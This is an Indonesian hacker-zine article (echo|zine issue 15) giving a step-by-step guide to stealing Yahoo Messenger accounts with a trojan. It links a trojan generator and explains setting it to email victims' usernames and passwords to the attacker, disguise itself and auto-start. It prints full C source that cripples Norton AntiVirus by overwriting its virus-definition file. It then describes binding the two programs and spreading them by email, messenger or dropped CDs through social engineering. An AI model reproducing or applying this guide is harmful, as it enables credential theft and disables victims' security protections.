@@ -1,0 +1,198 @@
+
+
+                           echo|zine, issue 15                           
+
+---------------------------[ Hackers Logbook ]----------------------------
+
+-----------------[ Hijack Yahoo Account Dengan Trojan ]-------------------
+---------------[ lirva32 <lirva32sf [at] yahoo [dot] com> ]---------------
+
+---//	Pengantar
+
+Kali ini kita main-main dengan trojan hhyuuukkkk ;) Trojannya nanti 
+kita kasih tugas untuk mendapatkan Yahoo account berupa username + passwordnya.
+Trojan ini memang diciptakan dan selalu dikembangkan sesuai dengan perkembangan 
+versi Yahoo Messenger.  Trojannya kita buat dengan trojan generator kemudian 
+kita binding (editor: binding <-> mengikat) dengan aplikasi pem-binding. Nanti 
+hasil dari pembindingannya kita sebar di beberapa tempat, bisa melalui email, 
+kirim langsung melalui YM atau dengan cara membuang (?) CD ditempat tertentu.
+
+---//	Bagaimana caranya?
+
+------[	Persiapan 
+
+- Magic-PS Trojan Generator.
+  Bisa Anda download disini : http://magic.shabgard.org/Magic-PS-15se++.zip
+- File Binder. Anda bisa memanfaatkan file binder apapun.
+- C Compiler
+
+------[Target Trojan 
+
+- User yang mempergunakan windows (-- yg pake linux aman bro ;)
+- User yang masih bisa kena 'social engineering' (bro.. terserah gimana
+  caranya deh.. biar tuh user bisa mati'in Antivirusnya....)
+  Kalo dia ga mau mati'in ya udah. Nanti kita matikan secara paksa
+  dengan coding tertentu (editor: jangan maen clurit ya? ;) ).
+
+------[Pembuatan Trojan 
+
+- Matikan semua Antivirus yang berada di komputer Anda 
+  (--hhikkzzz.. kalo ga dimatikan bakalan ga' bisa bikin trojan).
+- Buatlah sebuah folder untuk menempatkan hasil trojan.
+- Copy Magic-PS-15se++ ke dalam folder yang Anda buat, dan eksekusilah
+  trojan generator tersebut.
+  
+  Nanti tampilannya seperti ini :
+
+
+          +--------------------------------------------------+
+          | Magic-PS-15se                                    |
+          +--------------------------------------------------+
+          | Victim                                           |
+          |                                                  |
+          | [v] Send Y! Mess Pass     [ ] Send OS Name       |
+          | [ ] Send IP               [v] Auto Startup       |
+          | [ ] Send Computer Name    [ ] Send win UserName  |
+          | [ ] Disable taslmgr XP-2k [ ] Disable RegEdit    |
+          | [v] Disbale Y! save pass  [ ] Disable MsConfig   |
+          | [V] Delete Mess Archive   [ ] Melt After Install |
+          | [ ] Encode Pass        +---------------------+   |
+          | FileName After Install | regsvr.exe          |   |
+          |                        +---------------------+   |
+          | [ ] Fake Error Message                           |
+          |         +----------------------+                 |
+          | Caption |                      |  +-------+      |
+          |         +----------------------+  |       |      |
+          |         +----------------------+  | Test  |      |
+          | Message |                      |  +-------+      |
+          |         +----------------------+                 |
+          | Your Yahoo! ID that logged pass send to it       |
+          |         +----------------------+                 |
+          | Y! ID   |                      |                 |
+          |         +----------------------+                 |
+          | Just type ID don't use @yahoo.com Ex: john_26    |
+          | [  ] Binder     +------------+     +--------+    |
+          | [..] Extract to |TempDir     | Run |Normal  |    |
+          |                 +------------+     +--------+    |
+          | Choose icon (only for .exe and .scr)             |
+          | ( ) No icon     ( ) JPG icon    ( ) Setup icon   |
+          | ( ) Zip icon    ( ) RAR icon    ( ) Love icon    |
+          | ( ) Flash icon1 ( ) Flash icon2 ( ) Flash icon3  |
+          | ( ) Paint icon  ( ) PDF icon    ( ) Transparent  |
+          | MPS Creator                                      |
+          |           +---------------+                      |         
+          | FileName  |Sender.exe     |                      |
+          |           +---------------+                      |
+          +--------------------------------------------------+
+          | Create MPS    |   DeCoder   |   About   |  Exit  | 
+          +--------------------------------------------------+
+
+Keterangan Trojan :
+[01] Victim, pada bagian ini Anda bisa memberikan tugas tambahan pada
+     trojan yang Anda inginkan, misalkan saja mengambil IP Address si 
+     target.
+[02] File After Install, jika trojan ini dieksekusi maka trojan tersebut
+     akan melakukan penyamaran diri berupa file 'regsvr.exe'.  Anda bisa
+     memilih file penyamaran lainnya.
+[03] Y! ID, isi bagian ini dengan account Yahoo milik Anda. Ingat! Account 
+     ID milik Anda juga harus Yahoo! dan proses pengisian pada bagian tersebut 
+     tidak disertai "@yahoo.com". Jadi cukup mengisi ID saja. Trojan akan 
+     memberikan account + password si target ke email tersebut!
+[04] Choose icon, silahkan Anda memilih icon penyamaran trojan.
+[05] FileName, ini merupakan file trojan hasil generator.  File inilah yang
+     nantinya Anda kirim ke target yang menjadi sasaran kita ;)
+[06] Create MPS merupakan tombol yang men-generate trojan.
+
+
+------[ Penyiapan Routin Pembunuh NAV :
+
+        Bye bye NAV. Nah, ini adalah routine yang bisa Anda gunakan untuk 
+membunuh NAV secara paksa. Routine ini dibuat oleh teman saya : Magic_h2001
+(Hai 'Magic_h2001'... thx for ur code).
+
+//--- code ----//
+/*
+Kill Norton AntiVirus (All versions). Local Exploit.
+Norton AV can not protect this file : VIRSCAN1.DAT
+and can not Detect any virus after modify this file !
+(editor: jadi ceritanye nih, file .DAT nya dioverwrite ama data sampah)
+*/
+
+#include <windows.h>
+int main()
+{
+	HWND Lpbuff;
+	HKEY handle;
+	DWORD temp,size;
+	char buff[255],fName[255],dirName[255];
+	temp=RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\",0,KEY_READ,&handle);
+	if(temp!=ERROR_SUCCESS)
+		return 1;
+	size=sizeof(buff);
+	temp=RegQueryValueEx(handle,"CommonFilesDir",0,&temp,buff,&size);
+	if(temp!=ERROR_SUCCESS)
+		return 1;
+	RegCloseKey(handle);
+	strcat(buff,"\\Symantec Shared\\virusdefs\\");
+	strcpy(fName,buff);
+	strcat(buff,"definfo.dat");
+	SetFileAttributes(buff,FILE_ATTRIBUTE_ARCHIVE);
+	GetPrivateProfileString("DefDates","CurDefs","",dirName,sizeof(dirName),buff);
+	if(!strcmp(dirName,""))
+		return 1;
+	strcat(fName,dirName);
+	strcat(fName,"\\VIRSCAN1.DAT");
+	SetFileAttributes(fName,FILE_ATTRIBUTE_ARCHIVE);
+	handle=CreateFile(fName,GENERIC_WRITE,FILE_SHARE_READ,NULL,
+		OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL);
+	if(handle==INVALID_HANDLE_VALUE)
+		return 1;
+	size=GetFileSize(handle,&temp)-32;
+	Lpbuff=GlobalAlloc(GMEM_FIXED,size);
+	if(!Lpbuff)
+	{
+		CloseHandle(handle);
+		return 1;
+	}
+	FillMemory(Lpbuff,size,0x90);
+	SetFilePointer(handle,32,0,FILE_BEGIN);
+	WriteFile(handle,Lpbuff,size,&temp,NULL);
+	CloseHandle(handle);
+	return 0;
+}
+
+
+* Silahkan Anda Compile source code tersebut menjadi sebuah file eksekusi.
+//--- code ----//
+
+
+------[ Proses Penyerangan
+-
+Anggap saja dari beberapa proses tersebut diatas kita sudah mememiliki
+2 (dua) file yaitu : 
+- sender.exe     ----> trojan
+- killanvir.exe  ----> pembunuh NAV.
+
+        Kini saatnya Anda melakukan proses Binder terhadap keduanya. Yang 
+terpenting pada proses Binder file yang bekerja pertama adalah killanvir.exe.
+Ini agar sebelum trojannya jalan, NAV sudah terbunuh lebih dulu. Setelah 
+proses binding selesai kini saatnya Anda menyebarkan file tersebut ke target 
+yang dituju. Terserah, dengan metode apapun (editor: sekali lagi, jangan
+pakai clurit! ;) ).
+
+
+---//	Penutup
+Selamat menikmati trojan, dan ingat segala yang anda lakukan adalah tanggung 
+jawab anda, anda dapat menghubungi penulis untuk berdiskusi.
+
+---//	Shoutz 
+
+- echo|staff : y3dips,m0by,the_day,comex,z3r0byt3,k-159,c-a-s-e,s'to,lirva32,
+  anonymous
+- Anakku : Faiza Debian Navisa... yang mengisi hari2ku dengan keceriaannya...
+- My Friends : Mas Arif "s4k1tjiw4',az001, sevior,ocep_wie,sugeng_p,r34d3r,cbug,
+  cyb3rtank, cr4sh3r,istofani,#SolpotCrew, #BekasiHacker,#kecoak, #kalengbekas, 
+  #samarinda_hack, #aikmel, #renjana and AllNewbieHacker.
+- Asistenku : MadeSipit,Aghe,Arie
+- MyAlamamater : FTI-BudiLuhurUniversity
